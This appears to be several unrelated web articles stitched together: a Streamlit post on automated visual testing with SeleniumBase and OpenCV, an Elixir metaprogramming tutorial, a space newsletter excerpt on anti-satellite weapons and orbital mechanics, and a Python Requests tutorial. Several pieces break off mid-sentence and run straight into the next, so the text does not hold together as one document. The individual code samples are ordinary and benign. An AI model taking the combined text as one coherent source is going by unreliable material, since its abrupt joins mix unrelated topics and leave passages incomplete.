                    <p>In the time I’ve worked at Streamlit, I’ve seen hundreds of impressive data apps ranging from computer vision applications to public health <a href="https://discuss.streamlit.io/t/data-apps-regarding-covid-19/2203">tracking of COVID-19</a> and even simple <a href="https://joelgrus.com/2020/10/02/creating-games-in-streamlit/">children’s games</a>. I believe the growing popularity of Streamlit comes from the fast, iterative workflows through the <a href="https://docs.streamlit.io/en/stable/api.html?highlight=magic#magic-commands">Streamlit “magic”</a> functionality and auto-reloading the front-end upon saving your Python script. Write some code, hit ‘Save’ in your editor, then visually inspect the correctness of each code change. And with the unveiling of <a href="https://www.streamlit.io/sharing">Streamlit sharing</a> for easy deployment of Streamlit apps, you can go from idea to coding to deploying your app in just minutes!</p><p>Once you've created a Streamlit app, you can use automated testing to future-proof it against regressions. In this post, I'll be showing how to programmatically validate that a Streamlit app is unchanged visually using the Python package <a href="https://seleniumbase.io/">SeleniumBase</a>.</p><h2 id="case-study-streamlit-folium">Case Study: streamlit-folium</h2><p>To demonstrate how to create automated visual tests, I’m going to use the <a href="https://github.com/randyzwitch/streamlit-folium">streamlit-folium GitHub repo</a>, a Streamlit Component I created for the <a href="https://python-visualization.github.io/folium/">Folium Python library for leaflet.js</a>. <a href="https://baseweb.design/blog/visual-regression-testing/">Visual regression tests</a> help detect when the layout or content of an app changes, without requiring the developer to manually visually inspect the output each time a line of code changes in their Python library. Visual regression tests also help with cross-browser compatibility of your Streamlit apps and provide advanced warning about new browser versions affecting how your app is displayed.<br></p><figure><img src="https://lh5.googleusercontent.com/QxYpumCHmheacg4M2WTMLd8ZWTr4I2Kvo4zPJnC63cwQfQlXDojmaK3qbsmnNgNpudOaBTfg9CEH8y3MarInWbG4vs4O1ebI0oDvtrat6iPgkCngGPzSPHDyHMS1uUa1Uzclg22L" alt=""><figcaption>Baseline image of streamlit-folium test application</figcaption></figure><h3 id="setting-up-a-test-harness">Setting Up A Test Harness</h3><p>The streamlit-folium test harness has three files:</p><ul><li><a href="https://github.com/randyzwitch/streamlit-folium/blob/master/tests/requirements.txt"><code>tests/requirements.txt</code></a>: the Python packages only needed for testing</li><li><a href="https://github.com/randyzwitch/streamlit-folium/blob/master/tests/app_to_test.py"><code>tests/app_to_test.py</code></a>: the reference Streamlit app to test</li><li><a href="https://github.com/randyzwitch/streamlit-folium/blob/master/tests/test_package.py"><code>tests/test_package.py</code></a>: the tests to demonstrate the package works as intended</li></ul><p>The first step is to create a Streamlit app using the package to be tested and use that to set the baseline. We can then use SeleniumBase to validate that the structure and visual appearance of the app remains unchanged relative to the baseline. </p><p>This post focuses on describing <code>test_package.py</code> since it’s the file that covers how to use SeleniumBase and OpenCV for Streamlit testing.</p><h3 id="defining-test-success">Defining Test Success</h3><p>There are several ways to think about what constitutes looking <em>the same</em> in terms of testing. I chose the following three principles for testing my streamlit-folium package:</p><ol><li>The <a href="https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Introduction">Document Object Model (DOM) structure</a> (but not necessarily the values) of the page should remain the same</li><li>For values such as headings, test that those values are exactly equal</li><li>Visually, the app should look the same</li></ol><p>I decided to take these less strict definitions of “unchanged” for testing streamlit-folium, as the internals of the Folium package itself appear to be non-deterministic. Meaning, the same Python code will create the same <em>looking</em> image, but the generated HTML will be different.</p><h2 id="testing-using-seleniumbase">Testing Using SeleniumBase</h2><p>SeleniumBase is an all-in-one framework written in Python that wraps the <a href="https://www.selenium.dev/">Selenium WebDriver</a> project for browser automation. SeleniumBase has two functions that we can use for the first and second testing principles listed above: <a href="https://seleniumbase.io/examples/visual_testing/ReadMe/#automated-visual-regression-testing">check_window</a>, which tests the DOM structure and <a href="https://seleniumbase.io/help_docs/method_summary/">assert_text</a>, to ensure a specific piece of text is shown on the page. </p><p>To check the DOM structure, we first need a baseline, which we can generate using the <code>check_window</code> function. The <code>check_window</code> has two behaviors, based on the required <code>name</code> argument:</p><ul><li>If a folder &lt;<strong>name&gt;</strong> within the <code>visual_baseline/&lt;Python file&gt;.&lt;test function name&gt;</code> path does not exist, this folder will be created with all of the baseline files</li><li>If the folder <em>does exist</em>, then SeleniumBase will compare the current page against the baseline at the specified accuracy level</li></ul><p>You can see an example of calling <a href="https://github.com/randyzwitch/streamlit-folium/blob/master/tests/test_package.py#L19">check_window</a> and the resulting <a href="https://github.com/randyzwitch/streamlit-folium/tree/master/tests/visual_baseline/test_package.test_basic/first_test">baseline files</a> in the streamlit-folium repo. In order to keep the baseline constant between runs, I committed these files to the repo; if I were to make any substantive changes to the app I am testing (<code>app_to_test.py</code>), I would need to remember to set the new baseline or the tests would fail.</p><p>With the baseline folder now present, running check_window runs the comparison test. I chose to run the test at <strong>Level 2</strong>, with the level definitions as follows:</p><ul><li><strong>Level 1 (least strict)</strong>: HTML tags are compared to <a href="https://github.com/randyzwitch/streamlit-folium/blob/master/tests/visual_baseline/test_package.test_basic/first_test/tags_level_1.txt">tags_level1.txt</a></li><li><strong>Level 2</strong>: HTML tags and attribute names are compared to <a href="https://github.com/randyzwitch/streamlit-folium/blob/master/tests/visual_baseline/test_package.test_basic/first_test/tags_level_2.txt">tags_level2.txt</a></li><li><strong>Level 3 (most strict)</strong>: HTML tags, attribute names and attribute values are compared to <a href="https://github.com/randyzwitch/streamlit-folium/blob/master/tests/visual_baseline/test_package.test_basic/first_test/tags_level_3.txt">tags_level3.txt</a> &nbsp; &nbsp; </li></ul><p>As mentioned in the “Defining Test Success” section, I run the <code>check_window</code> function at Level 2, because the Folium library adds an GUID-like id value to the attribute values in the HTML, so the tests will never pass at Level 3 because the attribute values are always different between runs.</p><p>For the second test principle (“check certain values are equal”), the <code>assert_text</code> method is very easy to run:</p><p><code>self.assert_text("streamlit-folium")</code></p><p>This function checks that the exact text “streamlit-folium” is present in the app, and the test passes because it’s the value of the H1 heading in this example.</p><h2 id="testing-using-opencv">Testing Using OpenCV</h2><p>While checking the DOM structure and presence of a piece of text provides some useful information, my true acceptance criterion is that the visual appearance of the app doesn’t change from the baseline. In order to test that the app is visually the same <em>down to the pixel</em>, we can use the <code>save_screenshot</code> method from SeleniumBase to capture the current visual state of the app and compare to the baseline using the OpenCV package:</p><!--kg-card-begin: html--><!--kg-card-end: html--><p>Using OpenCV, the first step is to read in the baseline image and the current snapshot, then compare that the size of the pictures are identical (the <code>shape</code> comparison checks that the NumPy ndarrays of pixels have the same dimensions). Assuming the pictures are both the same size, we can then use the <code>subtract</code> function from OpenCV to calculate the per-element difference between pixels by channel (blue, green and red). If all three channels have no differences, then we know that the visual representation of the Streamlit app is identical between runs.</p><h2 id="automating-tests-using-github-actions">Automating Tests Using GitHub Actions</h2><p>With our SeleniumBase and OpenCV code set up, we can now feel free to make changes to our Streamlit Component (or other Streamlit apps) and not worry about things breaking unintentionally. In my single-contributor project, it’s easy to enforce running the tests locally, but with tools such as <a href="https://github.blog/2019-08-08-github-actions-now-supports-ci-cd/">GitHub Actions available for free for open-source projects</a>, setting up a <a href="https://www.infoworld.com/article/3271126/what-is-cicd-continuous-integration-and-continuous-delivery-explained.html">Continuous Integration pipeline</a> guarantees the tests are run for each commit.</p><p>The streamlit-folium has a workflow <a href="https://github.com/randyzwitch/streamlit-folium/blob/master/.github/workflows/run_tests_each_PR.yml"><code>run_tests_each_PR.yml</code></a> defined that does the following:</p><ul><li>Sets up a <a href="https://github.com/randyzwitch/streamlit-folium/blob/master/.github/workflows/run_tests_each_PR.yml#L18">test matrix for Python 3.6, 3.7, 3.8</a></li><li>Installs the <a href="https://github.com/randyzwitch/streamlit-folium/blob/master/.github/workflows/run_tests_each_PR.yml#L30">package dependencies</a> and <a href="https://github.com/randyzwitch/streamlit-folium/blob/master/.github/workflows/run_tests_each_PR.yml#L31">test dependencies</a></li><li><a href="https://github.com/randyzwitch/streamlit-folium/blob/master/.github/workflows/run_tests_each_PR.yml#L35-L37">Lints the code</a> with flake8</li><li><a href="https://github.com/randyzwitch/streamlit-folium/blob/master/.github/workflows/run_tests_each_PR.yml#L40">Install Chrome with seleniumbase</a></li><li><a href="https://github.com/randyzwitch/streamlit-folium/blob/master/.github/workflows/run_tests_each_PR.yml#L43">Run the Streamlit app</a> to test in the background</li><li>Run the <a href="https://github.com/randyzwitch/streamlit-folium/blob/master/.github/workflows/run_tests_each_PR.yml#L46">SeleniumBase and OpenCV tests in Python</a></li></ul><!--kg-card-begin: html--><!--kg-card-end: html--><p>By having this workflow defined in your repo, and <a href="https://docs.github.com/en/github/administering-a-repository/enabling-required-status-checks">required status checks enabled on GitHub</a>, every pull request will now have the following status check appended to the bottom, letting you know the status of your changes:</p><figure><img src="https://lh4.googleusercontent.com/JS0raqd2-aZ1J2AVCjl7kfQvNFpZkTK-rvcnnYvVBVY8yGV37OIRxrE6DPpQntQeU7ZilRI8Pvmjn4TP_PeXByZWEehHGHx5hPQaV4wuolCCNhondlxYHXm1f0a459trimHgPgjY" alt=""></figure><h2 id="writing-tests-saves-work-in-the-long-run">Writing Tests Saves Work In The Long Run</h2><p>Having tests in your codebase has numerous benefits. As explained above, automating visual regression tests allows you to maintain an app without having to have a human in the loop looking for changes. Writing tests is also a great signal to potential users that you care about stability and long-term maintainability of your projects. It’s not only easy to write tests for a Streamlit app and have them automatically run on each GitHub commit, but that the extra work of adding tests to your Streamlit project will save you time in the long run. &nbsp;</p><p><em>Have questions about this post or Streamlit in general?

    <div>
        <p><em>Metaprogramming</em> is a scary word: it sounds like voodoo for programmers, and in some manners it is. It is used by most popular Elixir libraries (Ecto, Phoenix and Elixir itself) and as I leveled up as an Elixir programmer, I needed to understand how it worked under the hood. </p><p>I personally felt intimidated by the topic, and I owned the <a href="https://pragprog.com/titles/cmelixir/metaprogramming-elixir/"><em>Metaprogramming Elixir</em> book</a> for more than a year before actually reading it 😱</p><figure><img src="https://www.christianblavier.com/content/images/2020/11/elixir-books.jpg" alt="" srcset="https://www.christianblavier.com/content/images/size/w600/2020/11/elixir-books.jpg 600w, https://www.christianblavier.com/content/images/size/w1000/2020/11/elixir-books.jpg 1000w, https://www.christianblavier.com/content/images/2020/11/elixir-books.jpg 1200w" sizes="(min-width: 720px) 720px"><figcaption>My Elixir personal library&nbsp;</figcaption></figure><p>But for any seasoned Elixir programmer, it is an excellent handbook and very pleasant to read. It is also pragmatic and I concur 100% with Chris McCord’s introductory advice:</p><blockquote>Rule 1 : Don't Write Macros - Chris McCord</blockquote><p>Be cautious with <em>metaprogramming</em> as it is hardly maintainable and a pain to debug; don't even think about writing your application core features with it. It is more relevant for technical libraries, custom DSL and any other specific subjects.</p><h2 id="it-s-a-kind-of-magic">It's a kind of magic</h2><p>As many of you, I came from a Ruby on Rails development background and I remember that while learning Rails, I was so impressed by the language expressivity and its magic features. Coming then from a Java background, it was a blessing to me!</p><figure><pre><code>irb&gt; 2.years.from_now + 5.days.from_now

irb&gt; Person.find_by_user_name_and_password(user_name, password)
#=&gt; #&lt;Person id: 10, user_name: "Ryan"&gt;</code></pre><figcaption>Ruby magic in action</figcaption></figure><p>Rails made indeed an intensive usage of Ruby dynamic features to extend the language at runtime: the <code>find_by_user_name_and_password</code> call &nbsp;just above is an example of dynamically generated class method based on the <code>Person</code> model attributes.</p><figure><img src="https://www.christianblavier.com/content/images/2020/11/90c9a1015850dff7dece6249e4a25eef.jpg" alt="" srcset="https://www.christianblavier.com/content/images/size/w600/2020/11/90c9a1015850dff7dece6249e4a25eef.jpg 600w, https://www.christianblavier.com/content/images/size/w1000/2020/11/90c9a1015850dff7dece6249e4a25eef.jpg 1000w, https://www.christianblavier.com/content/images/2020/11/90c9a1015850dff7dece6249e4a25eef.jpg 1024w" sizes="(min-width: 720px) 720px"><figcaption>How I felt when learning Ruby on Rails</figcaption></figure><p>But there are caveats to Ruby magic:</p><ul><li><a href="https://stackoverflow.com/questions/441717/whats-wrong-with-magic">too much magic</a> may hurt as you lack the understanding of what really happens under the hood. Same logic also applies to Elixir <em>metaprogramming</em> (remember Chris McCord's motto? "<em>Don't Write Macros" </em>😅)</li><li>Ruby magic is <strong>dynamic</strong> by nature which means it is performed at runtime, at the expense of performance. Whereas <strong>Elixir macros are evaluated at compile time</strong> and inserted in your bytecode as if it were manually written code.</li></ul><p>Before going deeper in the subject, it’s worth reminding that <em>metaprogramming</em> is the art of writing code that will generate code. <em>Metaprogramming</em> features are first class members of the Elixir language which provides macro API to rapidly extend the core language.</p><p>Did you know that <em>if-then-else</em> or <em>unless</em> block syntax are written in Elixir through its macro mechanism? It provides syntaxic sugar over a binary case pattern matching structure.</p><figure><pre><code>defmacro macro_unless(clause, do: expression) do
  quote do
    if(!unquote(clause), do: unquote(expression))
  end
end</code></pre><figcaption>unless block written with an Elixir macro</figcaption></figure><p>You could also be using meta-programmed features everyday without knowing it:</p><ul><li><a href="https://github.com/elixir-lang/elixir/tree/master/lib/ex_unit">ExUnit</a> test definitions leverages on macros</li><li><a href="https://github.com/elixir-ecto/ecto/blob/master/lib/ecto/query.ex">Ecto querying DSL</a> can perfectly mimic SQL language thanks to <em>metaprogramming</em></li><li>Of course Chris McCord’s Phoenix framework uses macro a lot, like the <a href="https://hexdocs.pm/phoenix/routing.html">Routing DSL</a></li></ul><p><strong>By the way, did you know that more than 90% of the Elixir sourcecode is written in Elixir? Meta enough for you? 🤯</strong></p><h2 id="elixir-macros-101">Elixir Macros 101</h2><p>Your first Elixir macros will be a bit tedious to write. I won’t give a full course about Elixir <em>metaprogramming</em> (buy <a href="https://pragprog.com/titles/cmelixir/metaprogramming-elixir/">Chris McCord’s book</a>!) but I will instead give you a few keys to understand it.</p><figure><img src="https://www.christianblavier.com/content/images/2020/11/CleanShot-2020-11-21-at-08.29.12@2x.png" alt="" srcset="https://www.christianblavier.com/content/images/size/w600/2020/11/CleanShot-2020-11-21-at-08.29.12@2x.png 600w, https://www.christianblavier.com/content/images/size/w1000/2020/11/CleanShot-2020-11-21-at-08.29.12@2x.png 1000w, https://www.christianblavier.com/content/images/2020/11/CleanShot-2020-11-21-at-08.29.12@2x.png 1182w" sizes="(min-width: 720px) 720px"><figcaption>Can't blame <a href="https://twitter.com/matt_chabert">Matthieu</a>, happened to me as well!</figcaption></figure><p>The main thing you need to understand is that all code you write in Elixir is represented in memory as an <em>Abstract Syntax Tree</em> (AST). The compiler will parse your code and turn it into an AST, then the BEAM will evaluate the AST in order to run it.</p><figure><img src="https://www.christianblavier.com/content/images/2020/11/Untitled-2020-11-20-0920.png" alt="" srcset="https://www.christianblavier.com/content/images/size/w600/2020/11/Untitled-2020-11-20-0920.png 600w, https://www.christianblavier.com/content/images/size/w1000/2020/11/Untitled-2020-11-20-0920.png 1000w, https://www.christianblavier.com/content/images/size/w1600/2020/11/Untitled-2020-11-20-0920.png 1600w, https://www.christianblavier.com/content/images/2020/11/Untitled-2020-11-20-0920.png 1938w" sizes="(min-width: 720px) 720px"><figcaption>Abstract Syntax Tree (AST)</figcaption></figure><p><em>Metaprogramming</em>, which we previously defined as « code to generate code » could be achieved by generating raw Elixir code (as strings) but it would be unefficient and hardly maintainable. </p><p>That’s why Elixir provides API’s to generate and evaluate AST. Here comes <code>quote</code>: an Elixir primitive which can convert any Elixir code into its AST.</p><pre><code>iex(1)&gt; quote do 5 + 8 * 3 end
#=&gt; {:+, [context: Elixir, import: Kernel],
#=&gt;   [5, {:*, 
#=&gt;     [context: Elixir, import: Kernel], 
#=&gt;     [8, 3]
#=&gt;   ]}]
#=&gt; }</code></pre><p>This code can be evaluated the same way you would have evaluated code in a string (think <code>eval</code> in <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval">Javascript</a>)</p><pre><code>iex(1)&gt; Code.eval_string("5 + 8 * 3")
#=&gt; {29, []}
iex(2)&gt; Code.eval_quoted(quote do 5 + 8 * 3 end)
#=&gt; {29, []}</code></pre><p>Now what happens if you try to evaluate code with dynamic parts? </p><pre><code>iex(1)&gt; a = 5
iex(2)&gt; Code.eval_string("3 * a")
#=&gt; ** (CompileError) nofile:1: undefined function a/0</code></pre><p>Of course <code>a</code> is unknown to your evaluated code and a simple way to fix this would be to use text interpolation.</p><pre><code>iex(1)&gt; a = 5
iex(2)&gt; Code.eval_string("3 * #{a}")
#=&gt; {15, []}</code></pre><p>Well the good news is you can interpolate within your quoted code as well: use the <code>unquote</code> primitive.</p><pre><code>iex(1)&gt; a = 5
iex(2)&gt; Code.eval_quoted(quote do 3 * unquote(a) end)
#=&gt; {15, []}</code></pre><p>Simple as that! So whenever you think you are lost between your <code>quote</code> / <code>unquote</code> blocks, just look at it as if it were text interpolation. </p><p>Then you need to know about <code>defmacro</code> which you probably already encountered in your Phoenix project. It's a special construct able to produce code, from quoted expressions and parameters.</p><p>Here is an example that generates a few functions :</p><pre><code>defmodule MyMacro do
  defmacro generate_functions(name_and_values) do
    for {name, value} &lt;- name_and_values do
      quote do
        def unquote(name)(), do: unquote(value)
      end
    end
  end
end

defmodule MyModule do
  require MyMacro
  
  MyMacro.generate_functions([{:one, 1}, {:two, 2}, {:three, 3}])
end

iex(1)&gt; MyModule.two + MyModule.three 
#=&gt; 5</code></pre><p>There are quite a few other things to know when it comes to Elixir <em>metaprogramming</em>, but <code>quote</code>, <code>unquote</code> and <code>defmacro</code> are the basics and can already help you to build powerful stuff.</p><h2 id="ok-but-what-for">Ok, but what for?</h2><p>I will end this post with some examples of the way we use <em>metaprogramming</em> in our Elixir projects.</p><h3 id="extends-ecto-query-api">Extends Ecto query API</h3><p>Ecto provides a fully featured querying API that mimics SQL. It relies on Elixir Macros and will be able to trigger compilation errors whenever your query is malformed.</p><figure><pre><code>iex(1)&gt; query = from u in User, where: u.age &gt; 0, select: u.name
iex(2)&gt; Repo.all(query)</code></pre><figcaption>Typical Ecto query</figcaption></figure><p>But every now and then you'll want to use some specific database functions not available in Ecto API. You can then use <code>fragment</code> Ecto function which let you insert raw SQL in your Ecto Query:</p><figure><pre><code>query = 
  from u in User,
  where: is_nil(fragment("?-&gt;&gt;?", u.metadata, "phone"))</code></pre><figcaption>Using fragment to access a field within a Postgres JSONB column</figcaption></figure><p>But the proper way is to leverage on macros to extend the Ecto query API:</p><figure><pre><code>defmodule MyQueryMacros do
  defmacro jsonb_get(column, key) do
    quote do
      fragment("?-&gt;&gt;?", unquote(column), unquote(key))
    end
  end
 end
 
 query = 
   from u in User,
   where: is_nil(jsonb_get(u.metadata, "phone"))</code></pre><figcaption>Same Ecto query using our homemade jsonb_get macro</figcaption></figure><h3 id="aliases-imports">Aliases &amp; Imports</h3><p>As your Elixir codebase grows, you can see that you repeat over and over the same <code>alias</code> and <code>import</code> blocks at the head of your files. Not really <a href="https://en.wikipedia.org/wiki/Don%27t_repeat_yourself">DRY</a>...</p><p>Phoenix already offers a solution you can use through the <code>use</code> / <code>__using__</code> macro. To declare a <em>controller</em> or a <em>view, </em>phoenix suggests a bunch of default aliases and imports declared in <code>my_app_web.ex</code> file. Here is an example of <a href="https://changelog.com/">changelog.com</a> <code>*_web.ex</code> file :</p><figure><a href="https://github.com/thechangelog/changelog.com/blob/master/lib/changelog_web.ex"><div><p>thechangelog/changelog.com</p><p>Hacker to the 💚. Contribute to thechangelog/changelog.com development by creating an account on GitHub.</p><p><img src="https://github.githubassets.com/favicons/favicon.svg"><span>GitHub</span></p></div><p><img src="https://avatars0.githubusercontent.com/u/161466?s=400&amp;v=4"></p></a></figure><p>You can then use the macro with the following snippet, which will <em>alias</em> and <em>import</em> a few Phoenix modules and even generate some authorization related functions:</p><pre><code>defmodule MyAppWeb.MyController do
  use MyAppWeb, :controller
  
  # ...
end</code></pre><p>In our own project, we also brewed our own <em>aliasing</em> system that we can use like this to prevent us from declaring the same aliases over and over.</p><pre><code>defmodule MyApp.Contracts.SomeContractService do
  use MyApp,
    aliases: [:campaigns, :contracts, :users],
    private_aliases: [:contracts]
    
  # ...
end   </code></pre><p>I may write further about these specific macros in another post 😉</p><h3 id="changix">changix</h3><p>A final example of how we use macros in our main Elixir application is our <strong>application changelog</strong>. We present new features, bug fixes and improvement to our users with a changelog sidebar (and a blinking badge to draw their attention).</p><figure><img src="https://www.christianblavier.com/content/images/2020/11/changelog.jpg" alt="" srcset="https://www.christianblavier.com/content/images/size/w600/2020/11/changelog.jpg 600w, https://www.christianblavier.com/content/images/size/w1000/2020/11/changelog.jpg 1000w, https://www.christianblavier.com/content/images/2020/11/changelog.jpg 1600w" sizes="(min-width: 720px) 720px"><figcaption>A changelog sidebar embedded in our webapp</figcaption></figure><p>Instead of feeding this changelog from database, we use <em>markdown</em> files with a <a href="https://jekyllrb.com/docs/front-matter/">YAML front matter</a> header.</p><figure><img src="https://www.christianblavier.com/content/images/2020/11/markdown.jpg" alt="" srcset="https://www.christianblavier.com/content/images/size/w600/2020/11/markdown.jpg 600w, https://www.christianblavier.com/content/images/size/w1000/2020/11/markdown.jpg 1000w, https://www.christianblavier.com/content/images/2020/11/markdown.jpg 1600w" sizes="(min-width: 720px) 720px"><figcaption>Our markdown changelog files, commited right along source code</figcaption></figure><p>At first, we used to parse these files at runtime everytime a user triggered the sidebar, then we cached the HTML output in memory in order to improve performance.</p><p>But after reading Chris McCord's book, we realized that these <em>markdown</em> files could be considered as source code and be compiled as well (or at least processed at compile-time). Here comes <a href="https://github.com/cblavier/changix"><strong>changix</strong></a>: a library relying on macros to provide compile-time changelog features. </p><figure><a href="https://github.com/cblavier/changix"><div><p>cblavier/changix</p><p>Compile-time changelog features for Elixir.

However, that war will (hopefully!) be slow and boring, with countries prioritizing directed energy and electronic attacks on satellites over kinetic ones so as to avoid creating debris that would deny space access as much to themselves as others. <a href="https://spaceflightnow.com/2020/07/23/u-s-officials-say-russia-tested-a-new-anti-satellite-weapon/" target="_blank">Russia</a>, the <a href="https://en.wikipedia.org/wiki/Anti-satellite_weapon#United_States_ASATs" target="_blank">US</a>, <a href="https://en.wikipedia.org/wiki/2007_Chinese_anti-satellite_missile_test" target="_blank">China</a>, &amp; <a href="https://carnegieendowment.org/2019/04/15/india-s-asat-test-incomplete-success-pub-78884" target="_blank">India</a> all have direct ascent anti-satellite weapons (with the latter three countries having spread space debris during ill-conceived weapons tests), and <a href="https://en.wikipedia.org/wiki/Arrow_3#:~:text=Arrow%203%20may%20serve%20as%20an%20anti-satellite%20weapon" target="_blank">Israel may as well</a>. At least the US and Russia also have <a href="https://www.theverge.com/2020/7/23/21335506/russia-anti-satellite-weapon-test-kosmos-2543" target="_blank">anti-satellite satellites</a> that <a href="https://www.theverge.com/2020/1/31/21117224/russian-satellite-us-spy-kosmos-2542-45-inspection-orbit-tracking" target="_blank">maneuver around</a> and muck with other satellites in undefined ways. These countries also likely have ground and satellite-based jammers and lasers (both dazzling and destructive). Satellites are very hard to defend because they have predictable orbits and very limited maneuvering budgets, so instead of having a few <a href="https://spacenews.com/the-end-of-sbirs-air-force-says-its-time-to-move-on/" target="_blank">exquisite satellites as the US military does now</a>, the US DOD is following (and <a href="https://www.theverge.com/2020/10/6/21503165/spacex-space-development-agency-contract-missile-warning-satellites-starlink" target="_blank">employing</a>) the NewSpace industry toward a proliferation of small, disposable satellites.

Orbital Mechanics has been around since well before artificial satellites were even remotely possible—for example, Walter Hohmann discovered his eponymous <a href="https://en.wikipedia.org/wiki/Hohmann_transfer_orbit" target="_blank">transfer orbit</a> in 1929. This simple transfer maneuver consists of two velocity changes, the first to elongate an orbital ellipse so that it intersects a target apogee and a second to circularize the ellipse (<a href="https://youtu.be/aKXNbf6NCKU" target="_blank">video explainer</a> 📺). Orbital plane changes, avoided whenever possible due to high energy cost, are completed by normal acceleration at the point around which the orbital plane should pivot. Meanwhile, rendezvous between two craft in different orbits often requires the application of multiple maneuvers (see <a href="https://www.spaceflightinsider.com/missions/human-spaceflight/breakdown-of-crew-1-flight-plan-an-inside-look/" target="_blank">Crew-1's flight plan</a>). Timing an orbital transfer is key, as the maneuvering spacecraft must give the target the correct lead time or it will end up&nbsp;in front or behind. Rendezvousing with another object in the same orbit is perhaps the most counterintuitive, as you must adjust your orbital period by leaving the shared orbit and later re-entering it. To "slow down" you accelerate to increase the height of your orbit, lengthening your orbital period relative to the other craft, let time pass, and then re-enter the original orbit once they've caught up. Conversely, to catch up, you decrease velocity to achieve a smaller, more eccentric orbit, which has a shorter orbital period. There are tons of resources out there for diving into the math of orbital mechanics (and related concepts like the <a href="https://en.wikipedia.org/wiki/Oberth_effect" target="_blank">Oberth effect</a> and Sun-synchronous orbits that are only possible because of torque from the <a href="https://en.wikipedia.org/wiki/Equatorial_bulge" target="_blank">Earth’s equatorial bulge</a>). Surprisingly, an easy read comes from the FAA's Office of Aerospace Medicine <a href="https://www.faa.gov/about/office_org/headquarters_offices/avs/offices/aam/cami/library/online_libraries/aerospace_medicine/tutorial/section3/spacecraft_design/" target="_blank">as part of their "Advanced Aerospace Medicine On-line" course</a> (we're not sure how Hohmann transfers relate to patching up wounded astronauts). You can also <a href="https://orbitalmechanics.info/" target="_blank">play with orbits in a simulator</a>, but we generally recommend <a href="https://www.kerbalspaceprogram.com/" target="_blank">Kerbal Space Program</a> if you really want to develop a more intuitive sense of two-body orbital mechanics while having a blast (pun very much intended). Sadly, KSP 2, the much-anticipated sequel with multiplayer support, <a href="https://www.polygon.com/2020/11/5/21551754/kerbal-space-program-2-release-date-delayed-2022" target="_blank">has now slipped to a 2022 release</a>.</p></div><!--[if mso]> <![endif]--> <!--[if mso]></table><![endif]--></div><div> <!--[if mso]><table align="left" border="0" cellspacing="0" cellpadding="0" width="100%" style="width:100%;"><tr> <![endif]--> <!--[if mso]><td valign="top" width="600" style="width:600px;"> <![endif]--><div> <strong>Papers</strong><ul><li> <a href="https://earthsky.org/space/is-it-true-that-jupiter-protects-earth" target="_blank">Jupiter may protect us from asteroids</a>, but it also likely prevented us from having siblings—had the solar system not had a gas giant, we might have up to 6 planets in our habitable zone (<a href="https://iopscience.iop.org/article/10.3847/1538-3881/ab9ffe" target="_blank">paper</a>).

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p>HTTP requests run the internet. These HTTP requests are made by devices or browsers(clients) when accessing a webpage.</p>

<p>In python, the Requests library allows us to make HTTP requests in our code and this is very key since many modern applications make use of data from third-party services by the use of APIs.</p>

<p>Python Requests is a great library. It allows you to make GET and POST requests with the options of passing URL parameters, adding headers, posting form data, and more.</p>

<p>With the library, you can make requests to almost every website/webpage, but its power lies in accessing APIs to retrieve data in the form of JSON which you can then work with within your code, applications, and scripts.</p>



<h2>Installing the Requests library</h2>

<p>To install the python Requests library, run the command:</p>

<pre><code>pip install requests</code></pre>

<p>This installs the Requests module and dependencies if any.</p>



<h2>Making a simple request with the Requests module</h2>

<p>Let's try to make a simple request to the python website, https://www.python.org ( you can use any website) :</p>

<pre><code>import requests

r = requests.get("https://www.python.org/")</code></pre>

<p>First, we begin by importing the Requests module. From the Requests module, we use a <code>get() </code>function with our website's URL passed in. With that line of code, a request is made to https://www.python.org and the<span> response is saved into the <code>r </code>variable</span>.</p>

<p>Making a request with the Requests module requires an internet connection.</p>

<p>Now we have a <span>Response object, r</span>. We can retrieve all the information we need from this object.</p>

<p>After a request is made, we get a response from the website's server and we can read the server's response code:</p>

<pre><code>r.status_code    # 200</code></pre>

<p>The status response code of 200 indicates a successful request. You can access the source code of the webpage by:</p>

<pre><code>print(r.text)        # prints webpage's source code</code></pre>

<p>The entire source code of the webpage will be printed in your console. This is useful when doing web scraping.</p>



<h2>Making requests to APIs</h2>

<p>By accessing APIs, we can tap into the full functionality of the Requests module. In this tutorial, we will use an API that returns some fake data from <a href="https://jsonplaceholder.typicode.com/">https://jsonplaceholder.typicode.com/posts</a>. The fake data that will be returned represents data of a blog; there are blog posts, users, and comments.</p>

<pre><code>import requests
r = requests.get("https://jsonplaceholder.typicode.com/posts")

print(r.status_code)    # 200</code></pre>

<p>Now, we have a Response object, r. We can retrieve all the information we need from it.</p>

<h2>Response Content</h2>

<p>We can read the content in various ways by using the <span>attributes and functions provided by the Request module</span>.</p>

<pre><code>r.status_code    # 200

r.encoding       # utf-8

r.url            # https://jsonplaceholder.typicode.com/posts

r.json()           # returns the json data

r.text           # returns the sourcecode

r.content        # returns the reponse body as bytes</code></pre>

<p><code>r.status_code </code>returns a code indicating whether a request was successful or not. 200 means successful. Common status codes that you have probably seen are 200, 404, and 500. 404 means client error and 500 means there was a server error.</p>

<p><code>r.encoding</code> returns the encoding of the response based on the HTTP headers.</p>

<p><code>r.url</code> returns the requested URL.</p>

<p><code>r.json()</code> returns a parsed JSON data from the response.</p>

<p><code>r.text</code> returns response is text format</p>

<p><code>r.content</code> returns the response formated in bytes</p>



<h2>Working with JSON response data</h2>

<p>The JSON data returned from <span>https://jsonplaceholder.typicode.com/posts </span>contains a lot of post data, we are going to need only one post data, therefore we will use this URL <span>https://jsonplaceholder.typicode.com/posts/1 </span>which returns only one post.</p>

<pre><code>import requests
r = requests.get("https://jsonplaceholder.typicode.com/posts/1")

print(r.json())</code></pre>

<p><strong>Output:</strong></p>

<pre><code>{'userId': 1, 'id': 1, 'title': 'sunt aut facere repellat provident occaecati excepturi optio
reprehenderit', 'body': 'quia et suscipit\nsuscipit recusandae consequuntur expedita 
etcum\nreprehenderit molestiae ut ut quas totam\nnostrum rerum est autem sunt rem eveniet architecto'}
</code></pre>

<p>Note that this is just some dummy data representing a post/article with a userId, Id, title, and body.</p>

<p><code>r.json()</code> parses the response into a Python-compatible data type i.e a dictionary or list.</p>



<pre><code>import requests
r = requests.get("https://jsonplaceholder.typicode.com/posts/1")

data = r.json()                    # json response is stored in 'data'

post_num = data['id']
user = data['userId']
title = data['title']
body = data['body']

print(f"Post number: {post_num}")
print(f"Written by user: {user}")
print("Title: " + title)
print("---------- Body ----------")                             
print(body)</code></pre>

<p><strong>Output</strong></p>

<pre><code>Post number: 1
Written by user: 1
